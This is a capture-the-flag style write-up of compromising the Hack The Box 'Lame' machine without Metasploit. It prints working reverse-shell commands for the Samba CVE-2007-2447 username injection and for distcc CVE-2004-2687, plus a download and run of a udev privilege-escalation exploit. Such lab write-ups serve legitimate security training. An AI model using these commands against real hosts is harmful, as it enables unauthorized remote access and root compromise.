# Lame Writeup w/o Metasploit

![](https://miro.medium.com/max/593/1*7Wkk8qE92Mwf1nWWbYS5mA.png)

## Reconnaissance <a id="491d"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.3
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that these ports are open:

* **Port 21:** running File Transfer Protocol \(FTP\) version 2.3.4. This allows anonymous login so we should keep that in mind.
* **Port 22:** running OpenSSH version 4.7p1.
* **Ports 139 and 445:** are running Samba v3.0.20-Debian.

![](https://miro.medium.com/max/973/1*fGBlZBuqIXOGRCWOVXqC9A.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.3
```

We get back the following result.

![](https://miro.medium.com/max/970/1*amZ5cn573yjsLh-TaxPBhQ.png)

We have a new port that did not show up in the initial scan.

* **Port 3632**: running the distributed compiler daemon distcc version 1.

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA nmap/udp 10.10.10.3
```

We get back the following result. As can be seen, all ports are either filtered or closed.

![](https://miro.medium.com/max/635/1*-SGvjjvid3UP15zWl8HouA.png)

Our initial recon shows that we potentially have four different points of entry to this machine.

## Enumeration <a id="000d"></a>

Let’s enumerate more to determine if any of these services are either misconfigured or running vulnerable versions.

**Port 21 vsftpd v2.3.4**

A quick google search shows us that this version is famously vulnerable to a backdoor command execution that is triggered by entering a string that contains the characters “:\)” as the username. When the backdoor is triggered, the target machine opens a shell on port 6200. This exploit is simple enough to exploit manually but we’re trying to move to more automation so let’s see if there is an nmap script that already checks for that.

```text
ls /usr/share/nmap/scripts/ftp*
```

![](https://miro.medium.com/max/843/1*Pz3xeIU0zH-_eSO-OBSnGw.png)

Execute the script on port 21 of the target machine.

```text
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```

![](https://miro.medium.com/max/673/1*qge5OrhEMmOqP4telrNoXw.png)

The script output shows that we’re not vulnerable to this vulnerability. Let’s move on to our second point of entry.

**Port 22 OpenSSH v4.7p1**

After a quick google search, nothing major pops up. Nmap contains multiple scripts that can brute force credentials amongst other things.

```text
ls /usr/share/nmap/scripts/ssh*
```

![](https://miro.medium.com/max/922/1*iEwTbzQMZUpIb8-T0_9c3A.png)

This might take a while and could potentially lead us nowhere so we’ll put this on the back burner and get back to it later if the other points of entry don’t pan out.

**Ports 139 and 445 Samba v3.0.20-Debian**

I have high hopes to gain at least an initial foothold using these ports.

Let’s use smbclient to access the SMB server.

```text
smbclient -L 10.10.10.3
```

* **-L**: lists what services are available on a server

Anonymous login is allowed.

![](https://miro.medium.com/max/758/1*JdVThushZEi-2L9CkVK3Sg.png)

Let’s view the permissions on the share drives.

```text
smbmap -H 10.10.10.3
```

* **-H**: IP of host

We get back the following result. Interesting! We have READ/WRITE access on the tmp folder.

![](https://miro.medium.com/max/736/1*0rkC0bR4rxpvEFHd4vokow.png)

Let’s go back to our google friend to see if this version of Samba is vulnerable. It seems to have had its fair share of [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-41384/Samba-Samba-3.0.20.html). We’re looking for a code execution vulnerability that would ideally give us Admin access. After going through all the code execution vulnerabilities, the simplest one that won’t require me to use Metasploit is [CVE-2007–2447](https://www.cvedetails.com/cve/CVE-2007-2447/).

The issue seems to be with the username field. If we send shell metacharacters into the username we exploit a vulnerability which allows us to execute arbitrary commands. Although the [exploit](https://www.exploit-db.com/exploits/16320) available on exploitdb uses Metasploit, reading through the code tells us that all the script is doing is running the following command, where “payload.encoded” would be a reverse shell sent back to our attack machine.

```text
"/=`nohup " + payload.encoded + "`"
```

Before we exploit this, let’s look at our last point of entry.

**Port 3632** **distcc v1**

Googling “distcc v1” reveals that this service is vulnerable to a remote code execution and there’s an nmap script that can verify that.

```text
nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3
```

The result shows us that it’s vulnerable!

![](https://miro.medium.com/max/725/1*kPeaLZx-dDl2QuHjHg2GtA.png)

So we have two potential ways to exploit this machine.

## Exploitation \#1: Samba <a id="fcd7"></a>

Add a listener on attack machine.

```text
nc -nlvp 4444
```

Log into the smb client.

```text
smbclient //10.10.10.3/tmp
```

As mentioned in the previous section, we’ll send shell metacharacters into the username with a reverse shell payload.

```text
logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
```

The shell connects back to our attack machine and we have root! In this scenario, we didn’t need to escalate privileges.

![](https://miro.medium.com/max/719/1*DdvA5iSrtgHA7NTjHO527A.png)

Grab the user flag.

![](https://miro.medium.com/max/519/1*W-JJhSQNW8QMzh2M1XoUbA.png)

Grab the root flag.

![](https://miro.medium.com/max/572/1*EFS66PmJse9YpGTSus10wA.png)

## Exploitation \#2: Distcc <a id="714d"></a>

In the previous section, we saw that this service is vulnerable to CVE 2004–2687 and there’s an nmap script that can be used to exploit this vulnerability and run arbitrary commands on the target machine.

First, start a listener on the attack machine.

```text
nc -nlvp 4444
```

Then, use the nmap script to send a reverse shell back to the attack machine.

```text
nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.6 4444 -e /bin/bash'"
```

![](https://miro.medium.com/max/722/1*XGycXseoW7pDQLJnfN6PwA.png)

The shell connects back to our attack machine and we have a non privileged shell!

![](https://miro.medium.com/max/692/1*a6yMG05f7RV-LU2091HSBQ.png)

We’ll need to escalate privileges. Google the OS version — Linux 2.6.24 to see if it is vulnerable to any exploits. I tried [CVE 2016–5195](https://www.exploit-db.com/exploits/40839) and [CVE 2008–0600](https://www.exploit-db.com/exploits/5093), but they didn’t work.

Let’s try [CVE 2009–1185](https://www.exploit-db.com/exploits/8572). Download the exploit from searchsploit.

```text
searchsploit -m 8572.c
```

Start up a server on your attack machine.

```text
python -m SimpleHTTPServer 9005
```

In the target machine download the exploit file.

```text
wget http://10.10.14.6:5555/8572.c
```

Compile the exploit.

```text
gcc 8572.c -o 8572
```

To run it, let’s look at the usage instructions.

![](https://miro.medium.com/max/677/1*I7M6fBne0AtCu96yQhG2eQ.png)

We need to do two things:

* Figure out the PID of the udevd netlink socket
* Create a run file in /tmp and add a reverse shell to it. Since any payload in that file will run as root, we’ll get a privileged reverse shell.

To get the PID of the udevd process, run the following command.

```text
ps -aux | grep devd
```

![](https://miro.medium.com/max/784/1*4zJv2v2CWRwcyAuQ9PNjIA.png)

Similarly, you can get it through this file as mentioned in the instructions.

![](https://miro.medium.com/max/623/1*JIArJfTIn6IPx7J8jV6NUw.png)

Next, create a **run** file in /tmp and add a reverse shell to it.

![](https://miro.medium.com/max/471/1*SFdTIwhLSQtQX_jdSN7B_Q.png)

Confirm that the reverse shell was added correctly.

![](https://miro.medium.com/max/522/1*-77rPpCHax0hvwOo42FSWA.png)

Set up a listener on your attack machine to receive the reverse shell.

```text
nc -nlvp 4445
```

Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.

```text
./8572 2661
```

We have root!

![](https://miro.medium.com/max/610/1*cW-sxid7icV3oHaN-5w3tQ.png)

We solved this machine in two different ways!

## Lessons Learned <a id="31ac"></a>

1. Always run a full port scan! We wouldn’t have discovered the vulnerable distributed compiler daemon distcc running on port 3632 if we only ran the initial scan. This gave us an initial foothold on the machine where we were eventually able to escalate privileges to root.
2. Always update and patch your software! In both exploitation methods, we leveraged publicly disclosed vulnerabilities that have security updates and patches available.
3. Samba ports should not be exposed! Use a firewall to deny access to these services from outside your network. Moreover, restrict access to your server to valid users only and disable WRITE access if not necessary.

